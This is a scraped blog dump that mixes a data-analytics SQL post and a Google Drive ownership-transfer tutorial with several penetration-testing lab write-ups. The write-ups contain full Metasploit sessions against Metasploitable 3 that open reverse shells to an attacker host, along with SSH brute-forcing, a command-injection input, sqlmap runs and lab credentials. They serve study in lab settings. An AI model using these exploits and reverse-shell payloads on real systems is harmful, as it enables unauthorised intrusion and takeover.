TotalTrips DESC LIMIT 7 Average ride_length for users by day_of_week Average ride_length for users by day_of_week\n1 2 3 SELECT member_casual, day_of_week, AVG(trip_duration) FROM tripdata GROUP BY member_casual, day_of_week Number of rides for users by day_of_week Number of rides for users by day_of_week\n1 2 SELECT member_casual, day_of_week, COUNT(DISTINCT ride_id) as number_of_rides FROM tripdata GROUP BY member_casual, day_of_week Share Visualizations and key findings\nTypes of rides Too many casual riders. Classic bike is commonly used.\nRides for each week Riders love weekends.\nRides per month Monthly average Weekly average Three recommendations based on analysis Casual riders ride longer than members. They also have more rides on weekends than members. Show casual riders why membership is better.\nShow casual riders how they can save money by purchasing memberships as they ride longer\nRun marketing campaigns targeting casual riders during weekends\nRun marketing campaigns targeting casual riders during summer months\n","date":"2023-08-15T00:00:00Z","permalink":"https://abriljordan.github.io/ajcasinillo/p/google-data-analytics/","title":"Data Analytics Project"},{"content":"Target: Metasploitable 3 Linux Tool: Metasploit Vulnerability: Drupal HTTP Parameter Key/Value SQL Injection \u0026ldquo;This module exploits the Drupal HTTP Parameter Key/Value SQL Injection (aka Drupageddon) in order to achieve a remote shell on the vulnerable instance. This module was tested against Drupal 7.0 and 7.31 (was fixed in 7.32). Two methods are available to trigger the PHP payload on the target: - set TARGET 0: Form-cache PHP injection method (default). This uses the SQLi to upload a malicious form to Drupal\u0026rsquo;s cache, then trigger the cache entry to execute the payload using a POP chain. - set TARGET 1: User-post injection method. This creates a new Drupal user, adds it to the administrators group, enable Drupal\u0026rsquo;s PHP module, grant the administrators the right to bundle PHP code in their post, create a new post containing the payload and preview it to trigger the payload execution.\u0026rdquo;\nhttps://www.rapid7.com/db/modules/exploit/multi/http/drupal_drupageddon/\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 [msf](Jobs:0 Agents:0) \u0026gt;\u0026gt; use exploit/multi/http/drupal_drupageddon [*] No payload configured, defaulting to php/meterpreter/reverse_tcp [msf](Jobs:0 Agents:0) exploit(multi/http/drupal_drupageddon) \u0026gt;\u0026gt; show targets Exploit targets: ================= Id Name -- ---- =\u0026gt; 0 Drupal 7.0 - 7.31 (form-cache PHP injection method) 1 Drupal 7.0 - 7.31 (user-post PHP injection method) [msf](Jobs:0 Agents:0) exploit(multi/http/drupal_drupageddon) \u0026gt;\u0026gt; set TARGET 0 TARGET =\u0026gt; 0 [msf](Jobs:0 Agents:0) exploit(multi/http/drupal_drupageddon) \u0026gt;\u0026gt; show options Module options (exploit/multi/http/drupal_drupageddon): Name Current Setting Required Description ---- --------------- -------- ----------- Proxies no A proxy chain of format type:host:port[,type:host:port][...] RHOSTS yes The target host(s), see https://docs.metasploit.com/docs/using-metasploit/ basics/using-metasploit.html RPORT 80 yes The target port (TCP) SSL false no Negotiate SSL/TLS for outgoing connections TARGETURI / yes The target URI of the Drupal installation VHOST no HTTP server virtual host Payload options (php/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- LHOST 127.0.0.1 yes The listen address (an interface may be specified) LPORT 4444 yes The listen port Exploit target: Id Name -- ---- 0 Drupal 7.0 - 7.31 (form-cache PHP injection method) View the full module info with the info, or info -d command. [msf](Jobs:0 Agents:0) exploit(multi/http/drupal_drupageddon) \u0026gt;\u0026gt; set RHOST 10.0.2.28 RHOST =\u0026gt; 10.0.2.28 [msf](Jobs:0 Agents:0) exploit(multi/http/drupal_drupageddon) \u0026gt;\u0026gt; set LHOST 10.0.2.16 LHOST =\u0026gt; 10.0.2.16 [msf](Jobs:0 Agents:0) exploit(multi/http/drupal_drupageddon) \u0026gt;\u0026gt; set TARGETURI /drupal/ TARGETURI =\u0026gt; /drupal/ [msf](Jobs:0 Agents:0) exploit(multi/http/drupal_drupageddon) \u0026gt;\u0026gt; exploit [*] Started reverse TCP handler on 10.0.2.16:4444 [*] Sending stage (39927 bytes) to 10.0.2.28 [*] Meterpreter session 1 opened (10.0.2.16:4444 -\u0026gt; 10.0.2.28:44842) at 2024-02-20 10:03:59 +0000 (Meterpreter 1)(/var/www/html/drupal) \u0026gt; getuid Server username: www-data (Meterpreter 1)(/var/www/html/drupal) \u0026gt; pwd /var/www/html/drupal (Meterpreter 1)(/var/www/html/drupal) \u0026gt; ","date":"2023-02-15T00:00:00Z","permalink":"https://abriljordan.github.io/ajcasinillo/p/drupal-http-parameter-key/value-sql-injection/","title":"Drupal HTTP Parameter Key/Value SQL Injection"},{"content":"Tutorial: Setting Up Google OAuth 2.0 and Using the OAuth Playground with Node.js This tutorial guides you through creating a Google Cloud project, setting up OAuth 2.0 credentials, and using the OAuth Playground to obtain a refresh token for Node.js integration.\nStep 1: Create a Google Cloud Project Go to the Google Cloud Console.\nClick Select a Project \u0026gt; New Project.\nEnter a Project Name and choose your Organization (if applicable).\nClick Create and wait for the project to be created.\nStep 2: Set Up OAuth 2.0 Credentials Navigate to the APIs \u0026amp; Services section on the left sidebar and select Credentials.\nClick Create Credentials \u0026gt; OAuth Client ID.\nIf prompted, configure the OAuth consent screen:\nSet the User Type to External. Add a suitable App Name. Set the Publishing Status to Testing. Add Test Users by entering their email addresses. Leave Scopes blank for now. Save the configuration. Return to Credentials and continue creating an OAuth client:\nSelect Web Application as the application type. Enter a suitable name. In Authorized Redirect URIs, add: 1 https://developers.google.com/oauthplayground Click Create. Copy the Client ID and Client Secret from the generated credentials.\nStep 3: Authorize APIs in the OAuth Playground Visit the OAuth Playground.\nIn the top-right corner, click the Settings icon.\nProvide the Client ID and Client Secret from the previous step. Check the box for “Use your own OAuth credentials.” Save the settings. On the left side, under Select \u0026amp; authorize APIs, expand the Google Drive API category.\nSelect the scope https://www.googleapis.com/auth/drive. Click Authorize APIs. Complete the authorization by signing in with a test user account you added earlier.\nClick Exchange authorization code for tokens to generate an access token and refresh token.\nCopy the Refresh Token displayed.\nTutorial: How to Get the File ID from Google Drive The File ID is a unique identifier for each file stored in Google Drive. It is required when using Google Drive APIs to manage or manipulate files programmatically.\nUsing the Google Drive Web Interface\nOpen Google Drive Visit Google Drive and log in with your Google account.\nLocate Your File Navigate to the file for which you want to retrieve the File ID.\nRight-Click and Select “Get Link”\nRight-click on the file and choose “Get Link”. Ensure the link-sharing settings are configured appropriately (e.g., anyone with the link can view). Copy the File ID\nThe shared link will look something like this: 1 https://drive.google.com/file/d/FILE_ID/view?usp=sharing The portion between /d/ and /view is the File ID. For example, if the link is: 1 https://drive.google.com/file/d/1MMPSPbuXezEOucdYvbgIsZtiYcdYa7qT4eBdv_gWm3M/view?usp=sharing The File ID is:\n1 1MMPSPbuXezEOucdYvbgIsZtiYcdYa7qT4eBdv_gWm3M Tutorial: Use Node.js in transferring ownership Install Dependencies 1 2 npm init -y npm install googleapis Node.js Code Example 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 const { google } = require(\u0026#39;googleapis\u0026#39;); // OAuth2 Client Setup const CLIENT_ID = \u0026#39;your-client-id\u0026#39;; const CLIENT_SECRET = \u0026#39;your-client-secret\u0026#39;; const REDIRECT_URI = \u0026#39;https://developers.google.com/oauthplayground\u0026#39;; const REFRESH_TOKEN = \u0026#39;your-refresh-token\u0026#39;; // File and Owner Details const FILE_ID = \u0026#39;your-file-id\u0026#39;; // Replace with your file ID const NEW_OWNER_EMAIL = \u0026#39;new-owner-email@example.com\u0026#39;; // Replace with the new owner\u0026#39;s email const oauth2Client = new google.auth.OAuth2( CLIENT_ID, CLIENT_SECRET, REDIRECT_URI ); // Set credentials with the refresh token oauth2Client.setCredentials({ refresh_token: REFRESH_TOKEN }); // Google Drive API client setup const drive = google.drive({ version: \u0026#39;v3\u0026#39;, auth: oauth2Client }); // Function to transfer ownership async function transferOwnership(fileId, newOwnerEmail) { try { // Step 1: Check the current permissions of the file const res1 = await drive.permissions.list({ fileId, supportsAllDrives: true, pageSize: 100, fields: \u0026#34;*\u0026#34;, }); // Find if the new owner is already in the permissions list let permissionId = \u0026#34;\u0026#34;; const permission = res1.data.permissions.find( ({ emailAddress }) =\u0026gt; emailAddress === newOwnerEmail ); // If no permission found, create new permission for writer role if (permission) { permissionId = permission.id; } else { const { data: { id } } = await drive.permissions.create({ fileId: fileId, sendNotificationEmail: true, supportsAllDrives: true, requestBody: { role: \u0026#34;writer\u0026#34;, type: \u0026#34;user\u0026#34;, emailAddress: newOwnerEmail, }, }); permissionId = id; } // Step 2: Update the permission to set the new owner as \u0026#34;pendingOwner\u0026#34; const res2 = await drive.permissions.update({ fileId, permissionId, supportsAllDrives: true, requestBody: { role: \u0026#34;writer\u0026#34;, pendingOwner: true, }, }); console.log(\u0026#39;Ownership transfer is pending:\u0026#39;, res2.data); } catch (error) { console.error(\u0026#39;Error transferring ownership:\u0026#39;, error.message); } } // Main function to run the process async function main() { await transferOwnership(FILE_ID, NEW_OWNER_EMAIL); } // Run the main function main(); Instructions for Use Replace the placeholders (your-client-id, your-client-secret, your-refresh-token, your-file-id, new-owner-email@example.com) with your actual data.\nFollow the tutorial to set up your Google OAuth 2.0 credentials and obtain the refresh token.\nUse this code in your Node.js project to transfer file ownership securely.\n","date":"2025-01-07T00:00:00Z","permalink":"https://abriljordan.github.io/ajcasinillo/p/transfer-google-docs/files-ownership/","title":"Transfer Google Docs/Files Ownership"},{"content":"Target: OWASP Mutillidae II What is OS command injection?\n\u0026quot; OS command injection is also known as shell injection. It allows an attacker to execute operating system (OS) commands on the server that is running an application, and typically fully compromise the application and its data. Often, an attacker can leverage an OS command injection vulnerability to compromise other parts of the hosting infrastructure, and exploit trust relationships to pivot the attack to other systems within the organization. \u0026quot;\nhttps://portswigger.net/web-security/os-command-injection\nls command ls is a Linux shell command that lists current directory contents of files and directories. By default, ‘ls’ lists files and directories in alphabetical order.\nType the \u0026lt;www.google.com\u0026gt; \u0026amp;\u0026amp; ls. This will search for DNS information for google and will execute the ls command indicating that the site is vunerable to command injection.\nThe uname -a command will display all system information, including the kernel name, network node hostname, kernel release date, kernel version, machine hardware name, processor type, hardware platform, and operating system.\n","date":"2024-03-10T00:00:00Z","permalink":"https://abriljordan.github.io/ajcasinillo/p/owasp-mutillidae-ii-command-injection/","title":"OWASP Mutillidae II - Command Injection"},{"content":"What is sensitive information disclosure vulnerability? When a website inadvertently provides users with sensitive information, this is known as sensitive information disclosure. We\u0026rsquo;ll be demonstrating a hardcoded credentials vulnerability utilizing the Client-side Comments page.\nFirst, open the Client-side Comments page by navigating to the following location in the menu: HTML/Javascript comments Right click, then choose View Page Source The hard-coded login credentials are located in a comment at the bottom of the source code-containing page ","date":"2024-03-10T00:00:00Z","permalink":"https://abriljordan.github.io/ajcasinillo/p/owasp-mutillidae-ii-sensitive-information-disclosure/","title":"OWASP Mutillidae II - Sensitive Information Disclosure"},{"content":"Target: Metasploitable 3 Linux Tool: Metasploit Vulnerability: ssh logins Port 22 / SSH Login Check Scanner\n\u0026ldquo;This module will test ssh logins on a range of machines and report successful logins. If you have loaded a database plugin and connected to a database this module will record successful logins and hosts so you can track your access.\u0026rdquo;\nhttps://www.rapid7.com/db/modules/auxiliary/scanner/ssh/ssh_login/\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 [msf](Jobs:0 Agents:0) \u0026gt;\u0026gt; search auxiliary/scanner/ssh/ssh_login Matching Modules ================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 auxiliary/scanner/ssh/ssh_login normal No SSH Login Check Scanner 1 auxiliary/scanner/ssh/ssh_login_pubkey normal No SSH Public Key Login Scanner Interact with a module by name or index. For example info 1, use 1 or use auxiliary/scanner/ssh/ssh_login_pubkey [msf](Jobs:0 Agents:0) \u0026gt;\u0026gt; use 0 [msf](Jobs:0 Agents:0) auxiliary(scanner/ssh/ssh_login) \u0026gt;\u0026gt; show options Module options (auxiliary/scanner/ssh/ssh_login): Name Current Setting Required Description ---- --------------- -------- ----------- ANONYMOUS_LOGIN false yes Attempt to login with a blank username and password BLANK_PASSWORDS false no Try blank passwords for all users BRUTEFORCE_SPEED 5 yes How fast to bruteforce, from 0 to 5 DB_ALL_CREDS false no Try each user/password couple stored in the current database DB_ALL_PASS false no Add all passwords in the current database to the list DB_ALL_USERS false no Add all users in the current database to the list DB_SKIP_EXISTING none no Skip existing credentials stored in the current database (Accepted: none, user, user \u0026amp;realm) PASSWORD no A specific password to authenticate with PASS_FILE no File containing passwords, one per line RHOSTS yes The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/usi ng-metasploit.html RPORT 22 yes The target port STOP_ON_SUCCESS false yes Stop guessing when a credential works for a host THREADS 1 yes The number of concurrent threads (max one per host) USERNAME no A specific username to authenticate as USERPASS_FILE no File containing users and passwords separated by space, one pair per line USER_AS_PASS false no Try the username as the password for all users USER_FILE no File containing usernames, one per line VERBOSE false yes Whether to print output for all attempts View the full module info with the info, or info -d command. [msf](Jobs:0 Agents:0) auxiliary(scanner/ssh/ssh_login) \u0026gt;\u0026gt; set RHOST 10.0.2.28 RHOST =\u0026gt; 10.0.2.28 [msf](Jobs:0 Agents:0) auxiliary(scanner/ssh/ssh_login) \u0026gt;\u0026gt; set USERNAME vagrant USERNAME =\u0026gt; vagrant [msf](Jobs:0 Agents:0) auxiliary(scanner/ssh/ssh_login) \u0026gt;\u0026gt; set PASSWORD vagrant PASSWORD =\u0026gt; vagrant [msf](Jobs:0 Agents:0) auxiliary(scanner/ssh/ssh_login) \u0026gt;\u0026gt; exploit [*] 10.0.2.28:22 - Starting bruteforce [+] 10.0.2.28:22 - Success: \u0026#39;vagrant:vagrant\u0026#39; \u0026#39;uid=900(vagrant) gid=900(vagrant) groups=900(vagrant),27(sudo) Linux metasploitable3-ub1404 3.13.0-170-generic #220-Ubuntu SMP Thu May 9 12:40:49 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux \u0026#39; [*] SSH session 1 opened (10.0.2.16:44067 -\u0026gt; 10.0.2.28:22) at 2024-02-20 13:01:21 +0000 [*] Scanned 1 of 1 hosts (100% complete) [*] Auxiliary module execution completed [msf](Jobs:0 Agents:1) auxiliary(scanner/ssh/ssh_login) \u0026gt;\u0026gt; sessions -i Active sessions =============== Id Name Type Information Connection -- ---- ---- ----------- ---------- 1 shell linux SSH root @ 10.0.2.16:44067 -\u0026gt; 10.0.2.28:22 (10.0.2.28) [msf](Jobs:0 Agents:1) auxiliary(scanner/ssh/ssh_login) \u0026gt;\u0026gt; ","date":"2024-01-18T00:00:00Z","permalink":"https://abriljordan.github.io/ajcasinillo/p/port-22-/-ssh-login-check-scanner/","title":"Port 22 / SSH Login Check Scanner"},{"content":"Target: Metasploitable 3 Linux Tool: Metasploit Vulnerability: phpMyAdmin Authenticated Remote Code Execution via preg_replace() phpMyAdmin Authenticated Remote Code Execution via preg_replace()\nPerform SQL Injection, login into the Metasploitable3 via SSH using the stolen credentials. Navigate to the var/www/html directory to locate the Apache web server documents.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 ┌─[parrot@parrot]─[~] └──╼ $ssh leia_organa@10.0.2.28 leia_organa@10.0.2.28\u0026#39;s password: Welcome to Ubuntu 14.04.6 LTS (GNU/Linux 3.13.0-170-generic x86_64) * Documentation: https://help.ubuntu.com/ Last login: Tue Mar 5 12:47:01 2024 from 10.0.2.16 leia_organa@metasploitable3-ub1404:~$ su luke_skywalker Password: luke_skywalker@metasploitable3-ub1404:/home/leia_organa$ cd .. luke_skywalker@metasploitable3-ub1404:/home$ ls abril artoo_detoo boba_fett c_three_pio greedo jabba_hutt kylo_ren leia_organa vagrant anakin_skywalker ben_kenobi chewbacca darth_vader han_solo jarjar_binks lando_calrissian luke_skywalker luke_skywalker@metasploitable3-ub1404:/home$ cd .. luke_skywalker@metasploitable3-ub1404:/$ ls bin dev home initrd.img.old lib64 media node_modules proc run srv tmp var vmlinuz.old boot etc initrd.img lib lost+found mnt opt root sbin sys usr vmlinuz luke_skywalker@metasploitable3-ub1404:/$ cd var/www/html luke_skywalker@metasploitable3-ub1404:/var/www/html$ ls 6GTNp.php chat DCz17U.php drupal jnf29p.php MbES5.php napXB.php payroll_app.php phpmyadmin luke_skywalker@metasploitable3-ub1404:/var/www/html$ nano payroll_app.php Open the payroll_app.php and explore the file to retrieve login credentials.\n1 $conn = new mysqli(\u0026#39;127.0.0.1\u0026#39;, \u0026#39;root\u0026#39;, \u0026#39;sploitme\u0026#39;, \u0026#39;payroll\u0026#39;); Username: root\nPassword: sploitme\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 [msf](Jobs:0 Agents:0) \u0026gt;\u0026gt; search phpMyAdmin Authenticated Remote Code Execution Matching Modules ================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 exploit/multi/http/zpanel_information_disclosure_rce 2014-01-30 excellent No Zpanel Remote Unauthenticated RCE 1 exploit/multi/http/phpmyadmin_lfi_rce 2018-06-19 good Yes phpMyAdmin Authenticated Remote Code Execution 2 exploit/multi/http/phpmyadmin_null_termination_exec 2016-06-23 excellent Yes phpMyAdmin Authenticated Remote Code Execution 3 exploit/multi/http/phpmyadmin_preg_replace 2013-04-25 excellent Yes phpMyAdmin Authenticated Remote Code Execution via preg_replace() Interact with a module by name or index. For example info 3, use 3 or use exploit/multi/http/phpmyadmin_preg_replace [msf](Jobs:0 Agents:0) \u0026gt;\u0026gt; use 3 [*] No payload configured, defaulting to php/meterpreter/reverse_tcp [msf](Jobs:0 Agents:0) exploit(multi/http/phpmyadmin_preg_replace) \u0026gt;\u0026gt; show options Module options (exploit/multi/http/phpmyadmin_preg_replace): Name Current Setting Required Description ---- --------------- -------- ----------- PASSWORD no Password to authenticate with Proxies no A proxy chain of format type:host:port[,type:host:port][...] RHOSTS yes The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metaspl oit.html RPORT 80 yes The target port (TCP) SSL false no Negotiate SSL/TLS for outgoing connections TARGETURI /phpmyadmin/ yes Base phpMyAdmin directory path USERNAME root yes Username to authenticate with VHOST no HTTP server virtual host Payload options (php/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- LHOST 127.0.0.1 yes The listen address (an interface may be specified) LPORT 4444 yes The listen port Exploit target: Id Name -- ---- 0 Automatic View the full module info with the info, or info -d command. [msf](Jobs:0 Agents:0) exploit(multi/http/phpmyadmin_preg_replace) \u0026gt;\u0026gt; set RHOST 10.0.2.28 RHOST =\u0026gt; 10.0.2.28 [msf](Jobs:0 Agents:0) exploit(multi/http/phpmyadmin_preg_replace) \u0026gt;\u0026gt; set LHOST 10.0.2.16 LHOST =\u0026gt; 10.0.2.16 [msf](Jobs:0 Agents:0) exploit(multi/http/phpmyadmin_preg_replace) \u0026gt;\u0026gt; set PASSWORD sploitme PASSWORD =\u0026gt; sploitme [msf](Jobs:0 Agents:0) exploit(multi/http/phpmyadmin_preg_replace) \u0026gt;\u0026gt; run [*] Started reverse TCP handler on 10.0.2.16:4444 [*] phpMyAdmin version: 3.5.8 [*] The target appears to be vulnerable. [*] Grabbing CSRF token... [+] Retrieved token [*] Authenticating... [+] Authentication successful [*] Sending stage (39927 bytes) to 10.0.2.28 [*] Meterpreter session 1 opened (10.0.2.16:4444 -\u0026gt; 10.0.2.28:33549) at 2024-03-05 13:41:26 +0000 (Meterpreter 1)(/var/www/html/phpmyadmin) \u0026gt; pwd /var/www/html/phpmyadmin (Meterpreter 1)(/var/www/html/phpmyadmin) \u0026gt; getuid Server username: www-data ","date":"2023-12-18T00:00:00Z","permalink":"https://abriljordan.github.io/ajcasinillo/p/phpmyadmin-authenticated-remote-code-execution-via-preg_replace/","title":"phpMyAdmin Authenticated Remote Code Execution via preg_replace()"},{"content":"Target: Metasploitable 3 Linux Tool: Metasploit Vulnerability: ProFTPD 1.3.5 proftpd_modcopy_exec Port 21 / ProFTPD 1.3.5\nCVE-2015-3306: The mod_copy module in ProFTPD 1.3.5 allows remote attackers to read and write to arbitrary files via the site cpfr and site cpto commands.\nhttps:// \u0026lt;www.rapid7.com/db/modules/exploit/unix/ftp/proftpd_modcopy_exec/\u0026gt;\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 [msf](Jobs:0 Agents:0) \u0026gt;\u0026gt; use exploit/unix/ftp/proftpd_modcopy_exec [*] No payload configured, defaulting to cmd/unix/reverse_netcat [msf](Jobs:0 Agents:0) exploit(unix/ftp/proftpd_modcopy_exec) \u0026gt;\u0026gt; show targets Exploit targets: ================= Id Name -- ---- =\u0026gt; 0 ProFTPD 1.3.5 [msf](Jobs:0 Agents:0) exploit(unix/ftp/proftpd_modcopy_exec) \u0026gt;\u0026gt; set TARGET 0 TARGET =\u0026gt; 0 [msf](Jobs:0 Agents:0) exploit(unix/ftp/proftpd_modcopy_exec) \u0026gt;\u0026gt; show options Module options (exploit/unix/ftp/proftpd_modcopy_exec): Name Current Setting Required Description ---- --------------- -------- ----------- CHOST no The local client address CPORT no The local client port Proxies no A proxy chain of format type:host:port[,type:host:port][...] RHOSTS yes The target host(s), see https://docs.metasploit.com/docs/using-metasploit/ basics/using-metasploit.html RPORT 80 yes HTTP port (TCP) RPORT_FTP 21 yes FTP port SITEPATH /var/www yes Absolute writable website path SSL false no Negotiate SSL/TLS for outgoing connections TARGETURI / yes Base path to the website TMPPATH /tmp yes Absolute writable path VHOST no HTTP server virtual host Payload options (cmd/unix/reverse_netcat): Name Current Setting Required Description ---- --------------- -------- ----------- LHOST 127.0.0.1 yes The listen address (an interface may be specified) LPORT 4444 yes The listen port Exploit target: Id Name -- ---- 0 ProFTPD 1.3.5 View the full module info with the info, or info -d command. [msf](Jobs:0 Agents:0) exploit(unix/ftp/proftpd_modcopy_exec) \u0026gt;\u0026gt; set RHOST 10.0.2.28 RHOST =\u0026gt; 10.0.2.28 [msf](Jobs:0 Agents:0) exploit(unix/ftp/proftpd_modcopy_exec) \u0026gt;\u0026gt; set LHOST 10.0.2.16 LHOST =\u0026gt; 10.0.2.16 [msf](Jobs:0 Agents:0) exploit(unix/ftp/proftpd_modcopy_exec) \u0026gt;\u0026gt; set SITEPATH /var/www/html SITEPATH =\u0026gt; /var/www/html [msf](Jobs:0 Agents:0) exploit(unix/ftp/proftpd_modcopy_exec) \u0026gt;\u0026gt; show payloads Compatible Payloads =================== # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 payload/cmd/unix/adduser normal No Add user with useradd 1 payload/cmd/unix/bind_awk normal No Unix Command Shell, Bind TCP (via AWK) 2 payload/cmd/unix/bind_netcat normal No Unix Command Shell, Bind TCP (via netcat) 3 payload/cmd/unix/bind_perl normal No Unix Command Shell, Bind TCP (via Perl) 4 payload/cmd/unix/bind_perl_ipv6 normal No Unix Command Shell, Bind TCP (via perl) IPv6 5 payload/cmd/unix/generic normal No Unix Command, Generic Command Execution 6 payload/cmd/unix/pingback_bind normal No Unix Command Shell, Pingback Bind TCP (via netcat) 7 payload/cmd/unix/pingback_reverse normal No Unix Command Shell, Pingback Reverse TCP (via netcat) 8 payload/cmd/unix/reverse_awk normal No Unix Command Shell, Reverse TCP (via AWK) 9 payload/cmd/unix/reverse_netcat normal No Unix Command Shell, Reverse TCP (via netcat) 10 payload/cmd/unix/reverse_perl normal No Unix Command Shell, Reverse TCP (via Perl) 11 payload/cmd/unix/reverse_perl_ssl normal No Unix Command Shell, Reverse TCP SSL (via perl) 12 payload/cmd/unix/reverse_python normal No Unix Command Shell, Reverse TCP (via Python) 13 payload/cmd/unix/reverse_python_ssl normal No Unix Command Shell, Reverse TCP SSL (via python) [msf](Jobs:0 Agents:0) exploit(unix/ftp/proftpd_modcopy_exec) \u0026gt;\u0026gt; set payload payload/cmd/unix/reverse_perl payload =\u0026gt; cmd/unix/reverse_perl [msf](Jobs:0 Agents:0) exploit(unix/ftp/proftpd_modcopy_exec) \u0026gt;\u0026gt; exploit [*] Started reverse TCP handler on 10.0.2.16:4444 [*] 10.0.2.28:80 - 10.0.2.28:21 - Connected to FTP server [*] 10.0.2.28:80 - 10.0.2.28:21 - Sending copy commands to FTP server [*] 10.0.2.28:80 - Executing PHP payload /4MUaAhC.php [+] 10.0.2.28:80 - Deleted /var/www/html/4MUaAhC.php [*] Command shell session 1 opened (10.0.2.16:4444 -\u0026gt; 10.0.2.28:44879) at 2024-02-20 12:08:32 +0000 uname -a Linux metasploitable3-ub1404 3.13.0-170-generic #220-Ubuntu SMP Thu May 9 12:40:49 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux whoami www-data pwd /var/www/html ","date":"2023-09-18T00:00:00Z","permalink":"https://abriljordan.github.io/ajcasinillo/p/port-21-/-proftpd-1.3.5/","title":"Port 21 / ProFTPD 1.3.5"},{"content":"Target: Metasploitable 3 Linux Tool: SQLmap Vulnerability: SQL Injection SQL Injection on Payroll Web Application using SQLmap\nAn open-source program called SQLmap is used in penetration tests to find and take advantage of injection vulnerabilities. Because SQLmap automates the process of identifying and taking advantage of SQL injection, it is especially helpful in saving time.\n┌─[parrot@parrot]─[~] └──╼ $sqlmap ___ __H__ ___ ___[.]_____ ___ ___ {1.7.2#stable} |_ -| . [\u0026#39;] | .\u0026#39;| . | |___|_ [(]_|_|_|__,| _| |_|V... |_| https://sqlmap.org Usage: python3 sqlmap [options] sqlmap: error: missing a mandatory option (-d, -u, -l, -m, -r, -g, -c, --wizard, --shell, --update, --purge, --list-tampers or --dependencies). Use -h for basic and -hh for advanced help [12:48:05] [WARNING] your sqlmap version is outdated ┌─[✗]─[parrot@parrot]─[~] └──╼ $sqlmap -u http://10.0.2.28/payroll_app.php --forms --dbs ___ __H__ ___ ___[(]_____ ___ ___ {1.7.2#stable} |_ -| . [,] | .\u0026#39;| . | |___|_ [.]_|_|_|__,| _| |_|V... |_| https://sqlmap.org [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user\u0026#39;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program [*] starting @ 12:50:06 /2024-03-03/ [12:50:06] [INFO] testing connection to the target URL [12:50:06] [INFO] searching for forms [1/1] Form: POST http://10.0.2.28/payroll_app.php POST data: user=\u0026amp;password=\u0026amp;s=OK do you want to test this form? [Y/n/q] \u0026gt; Y do you want to fill blank fields with random values? [Y/n] Y [12:50:50] [INFO] using \u0026#39;/home/parrot/.local/share/sqlmap/output/results-03032024_1250pm.csv\u0026#39; as the CSV results file in multiple targets mode [12:50:50] [INFO] checking if the target is protected by some kind of WAF/IPS [12:50:50] [INFO] testing if the target URL content is stable [12:50:51] [INFO] target URL content is stable [12:50:51] [INFO] testing if POST parameter \u0026#39;user\u0026#39; is dynamic [12:50:51] [WARNING] POST parameter \u0026#39;user\u0026#39; does not appear to be dynamic [12:50:51] [WARNING] heuristic (basic) test shows that POST parameter \u0026#39;user\u0026#39; might not be injectable [12:50:51] [INFO] testing for SQL injection on POST parameter \u0026#39;user\u0026#39; [12:50:51] [INFO] testing \u0026#39;AND boolean-based blind - WHERE or HAVING clause\u0026#39; [12:50:51] [WARNING] reflective value(s) found and filtering out [12:50:51] [INFO] testing \u0026#39;Boolean-based blind - Parameter replace (original value)\u0026#39; [12:50:51] [INFO] testing \u0026#39;MySQL \u0026gt;= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)\u0026#39; [12:50:52] [INFO] testing \u0026#39;PostgreSQL AND error-based - WHERE or HAVING clause\u0026#39; [12:50:52] [INFO] testing \u0026#39;Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)\u0026#39; [12:50:52] [INFO] testing \u0026#39;Oracle AND error-based - WHERE or HAVING clause (XMLType)\u0026#39; [12:50:52] [INFO] testing \u0026#39;Generic inline queries\u0026#39; [12:50:52] [INFO] testing \u0026#39;PostgreSQL \u0026gt; 8.1 stacked queries (comment)\u0026#39; [12:50:52] [INFO] testing \u0026#39;Microsoft SQL Server/Sybase stacked queries (comment)\u0026#39; [12:50:53] [INFO] testing \u0026#39;Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)\u0026#39; [12:50:53] [INFO] testing \u0026#39;MySQL \u0026gt;= 5.0.12 AND time-based blind (query SLEEP)\u0026#39; [12:51:03] [INFO] POST parameter \u0026#39;user\u0026#39; appears to be \u0026#39;MySQL \u0026gt;= 5.0.12 AND time-based blind (query SLEEP)\u0026#39; injectable it looks like the back-end DBMS is \u0026#39;MySQL\u0026#39;. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y for the remaining tests, do you want to include all tests for \u0026#39;MySQL\u0026#39; extending provided level (1) and risk (1) values? [Y/n] Y [12:51:23] 